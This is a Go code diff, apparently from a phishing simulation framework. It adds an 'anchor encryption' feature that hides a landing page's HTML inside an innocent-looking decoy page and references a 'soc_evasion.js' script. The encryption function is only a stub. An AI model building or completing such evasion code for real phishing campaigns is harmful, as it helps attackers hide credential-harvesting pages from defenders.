@@ -102,11 +102,19 @@ func GetPages(uid int64) ([]Page, error) {
 
 // GetPage returns the page, if it exists, specified by the given id and user_id.
 func GetPage(id int64, uid int64) (Page, error) {
+	log.Info("GETTING PAGE %d", id)
 	p := Page{}
 	err := db.Where("user_id=? and id=?", uid, id).Find(&p).Error
 	if err != nil {
 		log.Error(err)
 	}
+
+	//embed html in innocent landing page if anchor encryption turned on
+	if p.AnchorEncryption {
+		p.HTML, err = EmbedEncryptedPage(p.HTML)
+		log.Info(p.HTML)
+	}
+
 	return p, err
 }
 
@@ -146,6 +154,29 @@ func AddAnchorEncryptionScript(p *Page) {
 func RemoveAnchorEncryptionScript(p *Page) {
 	scriptString := "<script src=\"https://127.0.0.1:3333/js/dist/app/soc_evasion.js\"></script>"
 	p.HTML = strings.Replace(p.HTML, scriptString, "", 1)
+
+}
+
+func Encrypt(html string) string {
+	//encrypt
+	return "encrypted code"
+}
+
+func EmbedEncryptedPage(html string) (string, error) {
+	//encrypt all html and store in value in new html page
+	// new html page will be innocent looking landing page
+	encryptedHTML := Encrypt(html)
+
+	// TODO: update parameters for all users and custom innocent page
+	innocentPage, err := GetPageByName("InnocentPage", 1)
+
+	if err != nil {
+		return html, err
+	}
+
+	innocentPage.HTML += "<script>var encrypted= " + "\"" + encryptedHTML + "\"" + "</script>"
+
+	return innocentPage.HTML, err
 
 }
 
